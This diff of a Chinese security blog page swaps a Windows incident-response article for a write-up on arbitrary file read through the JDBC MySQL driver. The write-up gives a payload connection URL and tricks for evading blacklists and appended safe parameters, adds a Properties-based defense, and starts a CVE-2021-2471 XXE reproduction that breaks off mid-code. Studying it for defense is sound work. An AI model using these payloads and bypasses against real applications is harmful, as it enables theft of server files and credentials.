@@ -13,7 +13,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="https://mapl3miss.github.io/2025/07/16/windows应急/"/>
+    <link rel="canonical" href="https://mapl3miss.github.io/2025/09/19/jdbc-mysql任意文件读取漏洞/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -23,16 +23,16 @@
         
         <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="windows应急">
-<meta property="og:url" content="https://mapl3miss.github.io/2025/07/16/windows%E5%BA%94%E6%80%A5/index.html">
+<meta property="og:title" content="JDBC mysql任意文件读取漏洞">
+<meta property="og:url" content="https://mapl3miss.github.io/2025/09/19/JDBC-mysql%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://mapl3miss.github.io/images/redefine-og.webp">
-<meta property="article:published_time" content="2025-07-16T04:43:56.000Z">
-<meta property="article:modified_time" content="2025-07-16T05:36:37.361Z">
+<meta property="article:published_time" content="2025-09-19T04:22:05.000Z">
+<meta property="article:modified_time" content="2025-12-29T13:34:59.307Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="应急响应">
+<meta property="article:tag" content="javaSec">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://mapl3miss.github.io/images/redefine-og.webp">
     
@@ -46,7 +46,7 @@
     
     <title>
         
-            windows应急 | Mapl3miss&#39;s blog
+            JDBC mysql任意文件读取漏洞 | Mapl3miss&#39;s blog
         
     </title>
 
@@ -279,7 +279,7 @@
 		<div class="article-title relative w-full">
 			
 			<div class="w-full flex items-center pt-6 justify-start">
-				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">windows应急</h1>
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">JDBC mysql任意文件读取漏洞</h1>
 			</div>
 			
 		</div>
@@ -300,15 +300,15 @@
 					<div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2025-07-16 12:43:56</span>
-        <span class="mobile">2025-07-16 12:43:56</span>
+        <span class="desktop">2025-09-19 12:22:05</span>
+        <span class="mobile">2025-09-19 12:22:05</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-07-16 13:36:37</span>
-            <span class="mobile">2025-07-16 13:36:37</span>
+            <span class="desktop">2025-12-29 21:34:59</span>
+            <span class="mobile">2025-12-29 21:34:59</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -320,7 +320,7 @@
             <ul>
                 
                     <li>
-                        <a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a>&nbsp;
+                        <a href="/tags/javaSec/">javaSec</a>&nbsp;
                     </li>
                 
             </ul>
@@ -346,265 +346,90 @@
 
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-			<h3 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h3><h4 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a><strong>netstat</strong></h4><p>用于 显示网络连接、路由表、接口统计等信息</p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br><span class="line">普通用户</span><br><span class="line">netstat -abno</span><br><span class="line">需要管理员权限</span><br></pre></td></tr></table></figure></div>
+			<h1 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h1><p>当我们可以控制jdbc mysql连接的时候,我们可以通过设置如下这几个参数通过连接恶意mysql服务器来达到任意文件读取的危害</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">文件读取的参数</span><br><span class="line">allowLoadLocalInfileInPath=/ 设置读的目录为根目录，这样所有的目录文件都可以读取</span><br><span class="line">allowLoadLocalInfile=true 允许mysql读取客户端本地文件</span><br><span class="line">allowUrlInLocalInfile=true 允许mysql通过url的形式读取客户端本地文件(如果有udf或mysql插件允许使用http_get(url)这样的函数,又会导致ssrf漏洞)</span><br><span class="line"></span><br><span class="line">设置包大小参数</span><br><span class="line">maxAllowedPacket=655360</span><br></pre></td></tr></table></figure></div>
 
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">NETSTAT [-a] [-b] [-e] [-f] [-i] [-n] [-o] [-p proto] [-r] [-s] [-t] [-x] [-y] [interval]</span><br><span class="line"></span><br><span class="line"> -a            显示所有连接和侦听端口。</span><br><span class="line"> -b            显示创建每个连接所涉及的可执行文件或</span><br><span class="line">               侦听端口。在某些情况下，已知的可执行文件托管</span><br><span class="line">               多个独立组件，在这些情况下，将显示</span><br><span class="line">               创建连接</span><br><span class="line">               或侦听端口所涉及的组件序列。在这种情况下，可执行文件</span><br><span class="line">               名称位于 [] 底部，顶部是它调用的组件，</span><br><span class="line">               依此类推，直到达到 TCP/IP。请注意，此选项</span><br><span class="line">               可能很耗时，并且会失败，除非你有足够的</span><br><span class="line">               权限。</span><br><span class="line"> -n            以数字形式显示地址和端口号。</span><br><span class="line"> -o            显示与每个连接关联的拥有进程 ID。</span><br></pre></td></tr></table></figure></div>
+<p>核心机制:mysql可以要求客户端读取本地文件的,例如执行以下sql</p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LOAD DATA <span class="keyword">LOCAL</span> INFILE <span class="string">&#x27;/path/to/file&#x27;</span></span><br><span class="line"><span class="keyword">INTO</span> <span class="keyword">TABLE</span> t;</span><br></pre></td></tr></table></figure></div>
 
-<h4 id="tasklist"><a href="#tasklist" class="headerlink" title="tasklist"></a><strong>tasklist</strong></h4><p>用于 查看当前运行的所有进程</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc | findstr &#123;PID&#125;</span><br></pre></td></tr></table></figure></div>
+<p>底层 MySQL 协议流程是：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Server → Client : 请给我这个文件的内容 </span><br><span class="line">Client → Server : 好的，我把文件读出来发给你</span><br></pre></td></tr></table></figure></div>
 
-<p>获取关联dll的进程</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /m *.dll</span><br></pre></td></tr></table></figure></div>
+<p>客户端是被动执行mysql指令的</p>
+<p>现在我们如果可以控制一个客户端的jdbc连接点,就可以设置指定参数,利用这一特性来做到任意文件读取</p>
+<p>攻击流程:<br>客户端携带危险jdbc参数连接恶意mysql–&gt;客户端进行jdbc连接后的默认sql语句查询–&gt;mysql返回恶意指令,请求读取客户端文件–&gt;客户端jdbc自动将文件发送到mysql</p>
+<p>payload:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://127.0.0.1:3306/test?allowLoadLocalInfile=true&amp;allowUrlInLocalInfile=true&amp;allowLoadLocalInfileInPath=/&amp;maxAllowedPacket=65536&amp;user=fileread_file_path</span><br></pre></td></tr></table></figure></div>
 
-<h4 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a><strong>wmic</strong></h4><p>使用wmic获取进程及其命令(win11 22H2 及以上版本用不了了)</p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process get caption,commandline | findstr &quot;svchost.exe&quot;</span><br></pre></td></tr></table></figure></div>
+<p><em>mysql蜜罐应该也是用的这个漏洞</em></p>
+<h2 id="JDBC连接参数不完全可控的绕过"><a href="#JDBC连接参数不完全可控的绕过" class="headerlink" title="JDBC连接参数不完全可控的绕过"></a>JDBC连接参数不完全可控的绕过</h2><h4 id="注释符绕过"><a href="#注释符绕过" class="headerlink" title="注释符绕过"></a>注释符绕过</h4><p>有一些情景开发人员可能意识到了这个问题,采用url拼接已赋值的危险参数的形式来防护</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jdbcUrl</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;jdbcUrl&quot;</span>);</span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(jdbcUrl + <span class="string">&quot;&amp;serverTimezone=Asia/Shanghai&amp;allowLoadLocalInfile=false&amp;allowUrlInLocalInfile=false&quot;</span>);</span><br></pre></td></tr></table></figure></div>
 
-<p>powershell等效命令</p>
-<div class="code-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-CimInstance</span> Win32_Process | <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.Name <span class="operator">-eq</span> <span class="string">&quot;svchost.exe&quot;</span> &#125; | <span class="built_in">Select-Object</span> Name, CommandLine</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h3><p>WIN+R - regedit</p>
-<p>一、HKEY_CLASSES_ROOT</p>
-<p>HKEY_CLASSES_ROOT（简称HKCR）是Windows 10注册表中的一个重要根键，它包含了启动应用程序所需的全部信息，是应用程序运行时必需的信息仓库。这个键不仅关联了文件扩展名与应用程序，还包含了COM类注册信息，例如ProgID、CLSID和IID等。</p>
-<p>二、HKEY_CURRENT_USER</p>
-<p><code>**HKEY_CURRENT_USER**</code>（简称HKCU）是一个重要的根键，它包含了当前登录用户的所有配置信息。这些信息通常包括桌面设置、应用程序设置、网络配置、个人偏好等。当用户登录系统时，这些信息会从<code>**HKEY_USERS**</code>下相应的子键（即用户的SID键）复制到<code>**HKEY_CURRENT_USER**</code>，以提供对当前用户的快速访问。</p>
-<p>三、HKEY_LOCAL_MACHINE</p>
-<p>HKEY_LOCAL_MACHINE（简称HKLM）是Windows 10注册表中的一个核心根键，它保存了与当前计算机硬件配置（包括安装的硬件和软件）以及操作系统和软件的配置信息。这些信息是全局性的，适用于计算机上的所有用户。</p>
-<p>四、HKEY_USERS</p>
-<p>HKEY_USERS是Windows 10注册表中的一个根键，用于管理和存储系统中所有用户的配置信息。这个根键包含了缺省用户设置和登录用户的信息，这些设置决定了系统如何为每个用户呈现外观和行为。</p>
-<p>五、HKEY_CURRENT_CONFIG</p>
-<p>HKEY_CURRENT_CONFIG是Windows 10注册表中的一个根键，它保存了关于当前硬件配置的信息。这个根键在系统启动时确定哪些配置被加载，以及哪些驱动程序和服务被激活。它实际上是一个指向</p>
-<p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\HardwareProfiles\Current的别名，包含了在启动时由本地计算机系统使用的硬件配置文件的相关信息。这包括加载的设备驱动程序、显示时使用的分辨率等。</p>
-<p><strong>RegistryChangesView注册表对比工具</strong><br>创建快照<br><img  
+<p>在8.0.x版本可以使用注释符<code>#</code>来注释掉后面的内容,这样就可以注释掉拼接内容</p>
+<p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/images/Pastedimage20250716101956.png"
-                     
-                >随便操作一下(创建个用户)</p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user test 123456 /add</span><br></pre></td></tr></table></figure></div>
-
-<p>再创建一个快照文件，分别导入两个文件进行比对，或者直接选择与当前注册表比对<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/Pastedimage20250716102030.png"
-                     
-                ></p>
-<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>Win+R taskschd.msc<br>或<br>cmd schtasks<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/Pastedimage20250716102323.png"
+                     data-src="/images/Pastedimage20251227191833.png"
                      
                 ><br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/images/Pastedimage20250716102401.png"
-                     
-                ><br>OPENARK 工具<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/Pastedimage20250716102419.png"
+                     data-src="/images/Pastedimage20251227191938.png"
                      
                 ></p>
-<h3 id="系统账户"><a href="#系统账户" class="headerlink" title="系统账户"></a>系统账户</h3><p>Win+R lusrmgr.msc<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/Pastedimage20250716102531.png"
-                     
-                ></p>
-<h3 id="安全日志"><a href="#安全日志" class="headerlink" title="安全日志"></a>安全日志</h3><p><strong>系统日志</strong>: %SystemRoot%\System32\Winevt\Logs\System.evtx<br><strong>应用程序日志</strong>: %SystemRoot%\System32\Winevt\Logs\Application.evtx<br><strong>安全日志</strong>: %SystemRoot%\System32\Winevt\Logs\Security.evtx<br>(如C:\Windows\System32\winevt\Logs\日志)</p>
-<p><em>如何打开日志</em><br>我的电脑右键管理，如下，这里着重看安全日志<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/Pastedimage20250716104115.png"
-                     
-                ></p>
-<h5 id="日志字段说明"><a href="#日志字段说明" class="headerlink" title="日志字段说明"></a>日志字段说明</h5><p>Windows事件日志中记录的信息中，关键的要素包含事件级别、记录时间、事件来源、事件ID、事件描述、涉及的用户、计算机、操作代码及任务类别等。其中事件的ID与操作系统的版本有关，以下列举出的事件ID的操纵系统为Vista&#x2F;Win7&#x2F;Win8&#x2F;Win10&#x2F;Server2008&#x2F;Server 2012及之后的版本：</p>
-<table>
-<thead>
-<tr>
-<th>事件ID</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1102</td>
-<td>清理审计日志</td>
-</tr>
-<tr>
-<td>4624</td>
-<td>账号成功登录</td>
-</tr>
-<tr>
-<td>4625</td>
-<td>账号登录失败</td>
-</tr>
-<tr>
-<td>4768</td>
-<td>Kerberos身份验证（TGT请求）</td>
-</tr>
-<tr>
-<td>4769</td>
-<td>Kerberos服务票证请求</td>
-</tr>
-<tr>
-<td>4776</td>
-<td>NTLM身份验证</td>
-</tr>
-<tr>
-<td>4672</td>
-<td>授予特殊权限</td>
-</tr>
-<tr>
-<td>4720</td>
-<td>创建用户</td>
-</tr>
-<tr>
-<td>4726</td>
-<td>删除用户</td>
-</tr>
-<tr>
-<td>4728</td>
-<td>将成员添加到启用安全的全局组中</td>
-</tr>
-<tr>
-<td>4729</td>
-<td>将成员从安全的全局组中移除</td>
-</tr>
-<tr>
-<td>4732</td>
-<td>将成员添加到启用安全的本地组中</td>
-</tr>
-<tr>
-<td>4733</td>
-<td>将成员从启用安全的本地组中移除</td>
-</tr>
-<tr>
-<td>4756</td>
-<td>将成员添加到启用安全的通用组中</td>
-</tr>
-<tr>
-<td>4757</td>
-<td>将成员从启用安全的通用组中移除</td>
-</tr>
-<tr>
-<td>4719</td>
-<td>系统审计策略修改</td>
-</tr>
-</tbody></table>
-<p>五种事件类型中，最为重要的是成功审核（Success Audit），所有系统登录成功都会被标记成为成功审核。每个成功登录的事件都会标记一个登录类型：</p>
-<table>
-<thead>
-<tr>
-<th>登录类型</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>2</td>
-<td>交互式登录（用户从本地键盘上进行登录）</td>
-</tr>
-<tr>
-<td>3</td>
-<td>网络（例如：通过 <code>net use</code>、访问共享网络）</td>
-</tr>
-<tr>
-<td>4</td>
-<td>批处理（为批处理程序保留）</td>
-</tr>
-<tr>
-<td>5</td>
-<td>服务启动（服务登录）</td>
-</tr>
-<tr>
-<td>6</td>
-<td>不支持</td>
-</tr>
-<tr>
-<td>7</td>
-<td>解锁（当用户离开计算机，屏保启动锁定计算机，需要输入密码重新进入。失败的类型 7 登录表明有人输入了错误的密码或尝试解锁计算机）</td>
-</tr>
-<tr>
-<td>8</td>
-<td>网络明文（像类型 3 一样，但密码在网络上以明文传输）</td>
-</tr>
-<tr>
-<td>10</td>
-<td>远程交互（终端服务、远程桌面、远程辅助）</td>
-</tr>
-<tr>
-<td>11</td>
-<td>缓存域证书登录（使用缓存的域凭据登录，如笔记本电脑在脱机时登录）</td>
-</tr>
-</tbody></table>
-<h5 id="分析实例–查找创建账号的日志"><a href="#分析实例–查找创建账号的日志" class="headerlink" title="分析实例–查找创建账号的日志"></a>分析实例–查找创建账号的日志</h5><p>如下进行筛选<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/Pastedimage20250716131324.png"
-                     
-                ></p>
-<p>如下，根据日志，我们可以分析出历史创建账号的一些信息。</p>
+<p>在5.1.x版本不能通过#注释来绕过,但可以通过&amp;x&#x3D;这种形式来绕过,但拼接的内容不能是以&amp;开始</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/images/Pastedimage20250716131424.png"
+                     data-src="/images/Pastedimage20251227192519.png"
                      
-                ></p>
-<p>筛选账号成功登录的日志</p>
-<p>如下登录类型为2，代表该账号是从本地进行登录</p>
-<p><img  
+                ><br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/images/Pastedimage20250716131448.png"
+                     data-src="/images/Pastedimage20251227192547.png"
                      
                 ></p>
-<h5 id="观星平台"><a href="#观星平台" class="headerlink" title="观星平台"></a>观星平台</h5><p>Windows日志分析工具</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/Pastedimage20250716102749.png"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/Pastedimage20250716102749.png"
-                     
-                ></p>
-<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><h5 id="DnslookupView工具"><a href="#DnslookupView工具" class="headerlink" title="DnslookupView工具"></a>DnslookupView工具</h5><p>对终端进行监控，只要终端发起DNS解析请求即可获取到请求信息<br><a class="link"   target="_blank" rel="noopener" href="https://www.nirsoft.net/utils/dns_lookup_view.html" >https://www.nirsoft.net/utils/dns_lookup_view.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> <img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/Pastedimage20250709094007.png"
-                     
-                ></p>
-<h5 id="Sysmon"><a href="#Sysmon" class="headerlink" title="Sysmon"></a>Sysmon</h5><p>系统监控工具(Sysmon同时具有windows版和linux版)<br><a class="link"   target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon" >https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><strong>sysmon图形化管理工具</strong><br><a class="link"   target="_blank" rel="noopener" href="https://github.com/nshalabi/SysmonTools" >https://github.com/nshalabi/SysmonTools<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p><strong>Event ID</strong></p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Event ID 1: Process creation 进程创建  </span><br><span class="line">Event ID 2: A process changed a file creation time 进程更改了文件创建时间  </span><br><span class="line">Event ID 3: Network connection 网络连接  </span><br><span class="line">Event ID 4: Sysmon service state changed Sysmon 服务状态已更改  </span><br><span class="line">Event ID 5: Process terminated 进程终止  </span><br><span class="line">Event ID 6: Driver loaded 已加载驱动程序  </span><br><span class="line">Event ID 7: image loaded 文件镜像已加载  </span><br><span class="line">Event ID 8: CreateRemoteThread 创建远程线程  </span><br><span class="line">Event ID 9: RawAccessRead  </span><br><span class="line">Event ID 10: ProcessAccess 进程访问  </span><br><span class="line">Event ID 11: FileCreate 文件创建  </span><br><span class="line">Event ID 12: RegistryEvent (Object create and delete) 注册表事件  </span><br><span class="line">EVENT ID 12: REGISTRYEVENT (OBJECT CREATE AND DELETE)  </span><br><span class="line">Event ID 13: RegistryEvent (Value Set) 注册值设置  </span><br><span class="line">Event ID 14: RegistryEvent (Key and Value Rename)注册表键值设置  </span><br><span class="line">Event ID 15: FileCreateStreamHash 文件创建流哈希  </span><br><span class="line">Event ID 16: ServiceConfigurationChange sysmon配置文件更改  </span><br><span class="line">Event ID 17: PipeEvent (Pipe Created) 管道创建  </span><br><span class="line">Event ID 18: PipeEvent (Pipe Connected)管道连接  </span><br><span class="line">Event ID 19: WmiEvent (WmiEventFilter activity detected)  </span><br><span class="line">Event ID 21: WmiEvent (WmiEventConsumerToFilter activity detected)  </span><br><span class="line">Event ID 22: DNSEvent (DNS query) DNS查询  </span><br><span class="line">Event ID 23: FileDelete (File Delete archived) 已归档文件删除  </span><br><span class="line">Event ID 24: ClipboardChange (New content in the clipboard) 剪切板的新内容  </span><br><span class="line">Event ID 25: ProcessTampering (Process image change) 进程镜像文件修改  </span><br><span class="line">Event ID 26: FileDeleteDetected (File Delete logged) 记录文件删除  </span><br><span class="line">Event ID 255: Error Sysmon报错</span><br></pre></td></tr></table></figure></div>
+<h4 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h4><p>如果黑名单这样写</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isValidUrl</span><span class="params">(String url)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(url.contains(<span class="string">&quot;allowLoadLocalInfile&quot;</span>)||url.contains(<span class="string">&quot;allowUrlInLocalInfile&quot;</span>)||url.contains(<span class="string">&quot;allowLoadLocalInfileInPath&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
-<h5 id="火绒剑"><a href="#火绒剑" class="headerlink" title="火绒剑"></a>火绒剑</h5><p>火绒剑是一款专为Windows平台设计的安全分析工具，属于ARK（Anti-Rootkit）工具的一种。它能够单独分析某个特定进程，也可以监控系统中所有进程的活动。火绒剑经过微软官方的安全认证，因此在安装后，Windows Defender会自动关闭以避免冲突。<br><img  
+<p>那么在8.0.x是可以使用url编码的方式来对参数名和参数值进行编码,但5.1.x仅仅参数值可以被编码,无法绕过这个黑名单</p>
+<p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/images/Pastedimage20250716100903.png"
+                     data-src="/images/Pastedimage20251227194313.png"
                      
                 ></p>
-<h5 id="Process-Explorer"><a href="#Process-Explorer" class="headerlink" title="Process Explorer"></a>Process Explorer</h5><p><code>Process Explorer</code>让使用者能了解看不到的在后台执行的处理程序，能显示目前已经载入哪些模块，分别是正在被哪些程序使用着，还可显示这些程序所调用的<code>DLL</code>进程，以及他们所打开的句柄。<code>Process Explorer</code>最大的特色就是可以中终任何进程，甚至包括系统的关键进程<br><img  
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>使用预先定义的Properties将URL中的属性覆盖掉</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">properties.setProperty(<span class="string">&quot;allowLoadLocalInfile&quot;</span>,<span class="string">&quot;false&quot;</span>);</span><br><span class="line">properties.setProperty(<span class="string">&quot;allowUrlInLocalInfile&quot;</span>,<span class="string">&quot;false&quot;</span>);</span><br><span class="line">properties.setProperty(<span class="string">&quot;allowLoadLocalInfileInPath&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(DB_URL,properties);</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="JDBC-XXE-CVE-2021-2471"><a href="#JDBC-XXE-CVE-2021-2471" class="headerlink" title="JDBC XXE(CVE-2021-2471)"></a>JDBC XXE(CVE-2021-2471)</h1><p>这个漏洞是由于MySQL JDBC 8.0.27版本之前，存在<code>getSource()</code>方法未对传入的XML数据做校验，导致攻击者可以在XML数据中引入外部实体，造成XXE攻击</p>
+<p>利用条件比较苛刻,需要找到getSource()参数可控点</p>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>jdbc&#x3D;8.0.26</p>
+<h4 id="数据库返回恶意数据导致xxe-一般需要sqli漏洞配合"><a href="#数据库返回恶意数据导致xxe-一般需要sqli漏洞配合" class="headerlink" title="数据库返回恶意数据导致xxe(一般需要sqli漏洞配合)"></a>数据库返回恶意数据导致xxe(一般需要sqli漏洞配合)</h4><p>从数据库查数据之后经过getSource函数处理xml内容</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XXE</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">db_ip</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">db_port</span> <span class="operator">=</span> <span class="string">&quot;3306&quot;</span>;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">db_name</span> <span class="operator">=</span> <span class="string">&quot;test&quot;</span>;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">db_user</span> <span class="operator">=</span> <span class="string">&quot;test&quot;</span>;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">db_pass</span> <span class="operator">=</span> <span class="string">&quot;123456&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://&quot;</span>+db_ip+<span class="string">&quot;:&quot;</span>+db_port+<span class="string">&quot;/&quot;</span>+db_name+<span class="string">&quot;&quot;</span>;  </span><br><span class="line">        <span class="type">Connection</span> <span class="variable">con</span> <span class="operator">=</span> DriverManager.getConnection(url,db_user,db_pass);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT test FROM test LIMIT 1&quot;</span>;  </span><br><span class="line">        <span class="type">Statement</span> <span class="variable">stmt</span> <span 